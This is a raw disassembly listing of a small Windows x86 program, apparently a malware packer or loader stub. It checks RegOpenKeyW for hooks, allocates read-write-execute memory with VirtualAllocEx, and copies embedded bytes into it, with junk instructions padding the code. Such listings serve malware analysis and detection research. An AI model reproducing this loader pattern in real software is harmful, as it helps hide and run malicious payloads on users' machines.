0x00401000:	pushl	%ebp	; from: 0x0040149d(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	pushl	%ecx
0x00401004:	movl	$0x4, -4(%ebp)
0x0040100b:	movl	-4(%ebp), %eax
0x0040100e:	addl	$0x40dcda, %eax
0x00401013:	movl	%eax, 0x0042418c
0x00401018:	movl	%ebp, %esp
0x0040101a:	popl	%ebp
0x0040101b:	ret	; targets: 0x004014a2(MAY)

0x00401040:	pushl	%ebp	; from: 0x00401596(MAY)
0x00401041:	movl	%esp, %ebp
0x00401043:	subl	$0xc, %esp
0x00401046:	movl	0x8(%ebp), %eax
0x00401049:	movl	%eax, -8(%ebp)
0x0040104c:	movl	0xc(%ebp), %ecx
0x0040104f:	movl	%ecx, -12(%ebp)
0x00401052:	movl	$0x22b, -4(%ebp)
0x00401059:	movl	-8(%ebp), %edx
0x0040105c:	cmpl	-12(%ebp), %edx
0x0040105f:	jae	0x0040106f	; targets: 0x00401061(MAY)
0x00401061:	movl	$0x22b, -4(%ebp)	; from: 0x0040105f(MAY)
0x00401068:	movl	-8(%ebp), %eax
0x0040106b:	jmp	0x00401079	; targets: 0x00401079(MAY)
0x00401079:	movl	%ebp, %esp	; from: 0x0040106b(MAY)
0x0040107b:	popl	%ebp
0x0040107c:	ret	; targets: 0x0040159b(MAY)

0x00401080:	pushl	%ebp	; from: 0x0040154b(MAY)
0x00401081:	movl	%esp, %ebp
0x00401083:	subl	$0xc, %esp
0x00401086:	movl	$0x1e4dc, -8(%ebp)
0x0040108d:	movl	$0x3000, -12(%ebp)
0x00401094:	movl	$0x40, -4(%ebp)
0x0040109b:	movl	-4(%ebp), %eax
0x0040109e:	pushl	%eax
0x0040109f:	movl	-12(%ebp), %ecx
0x004010a2:	pushl	%ecx
0x004010a3:	movl	0x8(%ebp), %edx
0x004010a6:	pushl	%edx
0x004010a7:	pushl	$0x0
0x004010a9:	pushl	$0xffffffff
0x004010ab:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000020(MAY)
0x004010b1:	movl	%ebp, %esp
0x004010b3:	popl	%ebp
0x004010b4:	ret	; targets: 0x00401550(MAY)

0x004010c0:	pushl	%ebp	; from: 0x00401569(MAY)
0x004010c1:	movl	%esp, %ebp
0x004010c3:	popl	%ebp
0x004010c4:	ret	; targets: 0x0040156e(MAY)

0x004010d0:	pushl	%ebp	; from: 0x00401536(MAY)
0x004010d1:	movl	%esp, %ebp
0x004010d3:	movl	0x8(%ebp), %eax
0x004010d6:	movl	-4(%eax), %eax
0x004010d9:	popl	%ebp
0x004010da:	ret	; targets: 0x0040153b(MAY)

0x00401360:	pushl	%ebp	; from: 0x004015c1(MAY)
0x00401361:	movl	%esp, %ebp
0x00401363:	subl	$0x22c, %esp
0x00401369:	movl	$0x7c, -544(%ebp)
0x00401373:	movl	$0x0, -532(%ebp)
0x0040137d:	movl	$0x0, -552(%ebp)
0x00401387:	jmp	0x00401398	; targets: 0x00401398(MAY)
0x00401389:	movl	-552(%ebp), %eax	; from: 0x004013da(MAY)
0x0040138f:	addl	$0x1, %eax
0x00401392:	movl	%eax, -552(%ebp)
0x00401398:	movl	-552(%ebp), %ecx	; from: 0x00401387(MAY)
0x0040139e:	cmpl	0x10(%ebp), %ecx
0x004013a1:	jnl	0x004013dc	; targets: 0x004013dc(MAY), 0x004013a3(MAY)
0x004013a3:	movl	0xc(%ebp), %edx	; from: 0x004013a1(MAY)
0x004013a6:	addl	-552(%ebp), %edx
0x004013ac:	movzbl	(%edx), %eax
0x004013af:	movl	%eax, -556(%ebp)
0x004013b5:	movl	$0x7c, -544(%ebp)
0x004013bf:	movl	0x8(%ebp), %ecx
0x004013c2:	addl	-552(%ebp), %ecx
0x004013c8:	movb	-556(%ebp), %dl
0x004013ce:	movb	%dl, (%ecx)
0x004013d0:	movl	$0x33, -544(%ebp)
0x004013da:	jmp	0x00401389	; targets: 0x00401389(MAY)
0x004013dc:	movl	%ebp, %esp	; from: 0x004013a1(MAY)
0x004013de:	popl	%ebp
0x004013df:	ret	; targets: unresolved


start:
0x004013f0:	pushl	%ebp	; from: 0x00401498(MAY)
0x004013f1:	movl	%esp, %ebp
0x004013f3:	subl	$0xd0, %esp
0x004013f9:	pushl	%ebx
0x004013fa:	pushl	%esi
0x004013fb:	pushl	%edi
0x004013fc:	movl	%ebp, 0x004242a0
0x00401402:	pusha	
0x00401403:	movl	$0x0, -140(%ebp)
0x0040140d:	movl	$0x80000002, -160(%ebp)
0x00401417:	movl	RegOpenKeyW@advapi32.dll, %eax
0x0040141c:	movl	%eax, -184(%ebp)
0x00401422:	movl	RegOpenKeyW@advapi32.dll, %ecx
0x00401428:	movl	%ecx, -188(%ebp)
0x0040142e:	movl	$0x424030, -176(%ebp)
0x00401438:	movl	-188(%ebp), %edx
0x0040143e:	movzbl	(%edx), %eax
0x00401441:	cmpl	$0x8b, %eax
0x00401446:	je	0x0040145d	; targets: 0x0040145d(MAY), 0x00401448(MAY)
0x00401448:	movl	-188(%ebp), %ecx	; from: 0x00401446(MAY)
0x0040144e:	movzbl	(%ecx), %edx
0x00401451:	cmpl	$0x55, %edx
0x00401454:	je	0x0040145d	; targets: 0x0040145d(MAY), 0x00401456(MAY)
0x00401456:	xorl	%eax, %eax	; from: 0x00401454(MAY)
0x00401458:	jmp	0x00401775	; targets: 0x00401775(MAY)
0x0040145d:	movl	$0x53, %eax	; from: 0x00401446(MAY), 0x00401454(MAY)
0x00401462:	movl	-176(%ebp), %ecx
0x00401468:	movw	%ax, 0x4(%ecx)
0x0040146c:	movl	$0x49, %edx
0x00401471:	movl	-176(%ebp), %eax
0x00401477:	movw	%dx, 0x6(%eax)
0x0040147b:	leal	-180(%ebp), %ecx
0x00401481:	pushl	%ecx
0x00401482:	movl	-176(%ebp), %edx
0x00401488:	pushl	%edx
0x00401489:	pushl	$0x80000000
0x0040148e:	call	-184(%ebp)	; targets: 0xff000030(MAY)
0x00401494:	testl	%eax, %eax
0x00401496:	je	0x0040149d	; targets: 0x0040149d(MAY), 0x00401498(MAY)
0x00401498:	call	start	; targets: 0x004013f0(MAY)	; from: 0x00401496(MAY)
0x0040149d:	call	0x00401000	; targets: 0x00401000(MAY)	; from: 0x00401496(MAY), 0x0040177b(MAY)
0x004014a2:	movl	$0x64, -128(%ebp)	; from: 0x0040101b(MAY)
0x004014a9:	movl	$0x2, -28(%ebp)
0x004014b0:	movl	$0x0, -140(%ebp)
0x004014ba:	movl	$0x0, -84(%ebp)
0x004014c1:	movl	$0x1, -124(%ebp)
0x004014c8:	movl	$0x0, -20(%ebp)
0x004014cf:	movl	$0x64, -128(%ebp)
0x004014d6:	movl	$0x2, -28(%ebp)
0x004014dd:	movl	$0x0, -140(%ebp)
0x004014e7:	movl	$0x0, -84(%ebp)
0x004014ee:	movl	$0x1, -124(%ebp)
0x004014f5:	movl	$0x3, -24(%ebp)
0x004014fc:	movl	$0x0, -20(%ebp)
0x00401503:	movl	$0x64, -128(%ebp)
0x0040150a:	movl	$0x2, -28(%ebp)
0x00401511:	movl	$0x0, -140(%ebp)
0x0040151b:	movl	$0x0, -84(%ebp)
0x00401522:	movl	$0x1, -124(%ebp)
0x00401529:	movl	$0x3, -24(%ebp)
0x00401530:	movl	0x0042418c, %eax
0x00401535:	pushl	%eax
0x00401536:	call	0x004010d0	; targets: 0x004010d0(MAY)
0x0040153b:	addl	$0x4, %esp	; from: 0x004010da(MAY)
0x0040153e:	movl	%eax, -144(%ebp)
0x00401544:	movl	-144(%ebp), %ecx
0x0040154a:	pushl	%ecx
0x0040154b:	call	0x00401080	; targets: 0x00401080(MAY)
0x00401550:	addl	$0x4, %esp	; from: 0x004010b4(MAY)
0x00401553:	movl	%eax, -136(%ebp)
0x00401559:	movl	-144(%ebp), %edx
0x0040155f:	pushl	%edx
0x00401560:	pushl	$0x0
0x00401562:	movl	-136(%ebp), %eax
0x00401568:	pushl	%eax
0x00401569:	call	0x004010c0	; targets: 0x004010c0(MAY)
0x0040156e:	addl	$0xc, %esp	; from: 0x004010c4(MAY)
0x00401571:	movl	-144(%ebp), %ecx
0x00401577:	movl	%ecx, -152(%ebp)
0x0040157d:	movl	-140(%ebp), %edx
0x00401583:	cmpl	-144(%ebp), %edx
0x00401589:	jae	0x004015f8	; targets: 0x0040158b(MAY)
0x0040158b:	movl	-152(%ebp), %eax	; from: 0x00401589(MAY)
0x00401591:	pushl	%eax
0x00401592:	movl	-128(%ebp), %ecx
0x00401595:	pushl	%ecx
0x00401596:	call	0x00401040	; targets: 0x00401040(MAY)
0x0040159b:	addl	$0x8, %esp	; from: 0x0040107c(MAY)
0x0040159e:	movl	%eax, -156(%ebp)
0x004015a4:	movl	-156(%ebp), %edx
0x004015aa:	pushl	%edx
0x004015ab:	movl	0x0042418c, %eax
0x004015b0:	addl	-84(%ebp), %eax
0x004015b3:	pushl	%eax
0x004015b4:	movl	-136(%ebp), %ecx
0x004015ba:	addl	-140(%ebp), %ecx
0x004015c0:	pushl	%ecx
0x004015c1:	call	0x00401360	; targets: 0x00401360(MAY)
0x00401775:	popl	%edi	; from: 0x00401458(MAY)
0x00401776:	popl	%esi
0x00401777:	popl	%ebx
0x00401778:	movl	%ebp, %esp
0x0040177a:	popl	%ebp
0x0040177b:	ret	; targets: 0xfee70000(MAY), 0x0040149d(MAY)

